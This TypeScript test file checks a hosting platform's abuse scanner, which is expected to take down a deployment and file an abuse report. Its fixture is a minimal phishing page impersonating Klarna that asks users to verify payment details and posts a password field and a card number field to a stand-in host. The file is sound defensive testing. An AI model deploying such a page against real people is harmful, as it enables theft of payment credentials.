import { describe, it, expect, afterAll } from "vitest";
import { connect, runMigrations, eq, users, workspaces, projects, deployments, abuseReports } from "@forge/db";
import { newId } from "@forge/shared";
import { scanDeployment, MockUrlReputation } from "../src/index.js";

const h = connect(undefined, 2);
afterAll(() => h.close());

describe("scanDeployment", () => {
  it("files a report and takes a malicious deployment down", async () => {
    await runMigrations();
    const uid = newId("usr");
    const ws = newId("ws");
    const prj = newId("prj");
    const dep = newId("dep");
    await h.db.insert(users).values({ id: uid, email: `${uid}@t.local` });
    await h.db.insert(workspaces).values({ id: ws, name: "w" });
    await h.db.insert(projects).values({ id: prj, workspaceId: ws, name: "p", createdBy: uid });
    await h.db.insert(deployments).values({ id: dep, projectId: prj, provider: "local", region: "eu", status: "live" });
    const r = await scanDeployment(h.db, new MockUrlReputation(), {
      projectId: prj,
      deploymentId: dep,
      files: { "index.html": `<title>Klarna</title><p>Verify your payment details</p><form action="https://x.example/c"><input type="password"><input autocomplete="cc-number"></form>` },
    });
    expect(r.action).toBe("taken_down");
    const [d] = await h.db.select().from(deployments).where(eq(deployments.id, dep));
    expect(d?.status).toBe("taken_down");
    const [rep] = await h.db.select().from(abuseReports).where(eq(abuseReports.id, r.reportId!));
    expect(rep).toMatchObject({ status: "open", source: "scan" });
  });
});
